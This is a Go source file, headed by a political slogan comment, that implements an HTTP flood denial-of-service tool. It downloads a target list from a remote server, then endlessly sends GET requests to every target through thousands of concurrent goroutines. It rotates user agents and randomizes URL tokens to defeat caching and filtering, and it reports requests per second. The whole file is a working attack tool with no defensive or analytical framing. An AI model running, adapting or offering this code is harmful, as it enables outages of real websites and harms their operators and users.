// Taiwan stand with Israel
package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/big"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

type Result struct {
	URLs []string `json:"targets"`
}

type UserAgent struct {
	UserAgent string `json:"USER_AGENT"`
}

var MaxGoroutines = 5000

func main() {
	args := os.Args
	if len(args) > 1 {
		maxGoroutines, err := strconv.Atoi(args[1])
		if err != nil {
			fmt.Println("Invalid number of max goroutines, using default:", MaxGoroutines)
		} else {
			MaxGoroutines = maxGoroutines
			fmt.Println("thread set to:", MaxGoroutines)
		}
	}
	client := &http.Client{
		Timeout: time.Second * 10,
	}

	resp, err := client.Get("https://fuck-hamas.com/targets.json")
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	var result Result
	json.Unmarshal(body, &result)

	content, err := ioutil.ReadFile("user_agents.json")
	if err != nil {
		panic(err)
	}

	var userAgents []UserAgent
	json.Unmarshal(content, &userAgents)

	semaphore := make(chan struct{}, MaxGoroutines)

	var counter uint64
	go func() {
		for {
			time.Sleep(time.Second)
			count := atomic.SwapUint64(&counter, 0)
			fmt.Println("Requests per second:", count)
		}
	}()

	for {
		for _, url := range result.URLs {
			semaphore <- struct{}{}
			go func(url string) {
				defer func() { <-semaphore }()

				randomURL := generateRandomURL(url)
				req, err := http.NewRequest("GET", randomURL, nil)
				if err != nil {
					return
				}

				index, err := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents))))
				if err != nil {
					return
				}

				req.Header.Set("User-Agent", userAgents[index.Int64()].UserAgent)

				_, err = client.Do(req)
				if err != nil {
					return
				}
				atomic.AddUint64(&counter, 1)
			}(url)
		}
	}
}

func generateRandomURL(url string) string {
	return strings.Replace(url, "R4ND0M", randomHex(10), -1)
}

func randomHex(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return hex.EncodeToString(bytes)
}
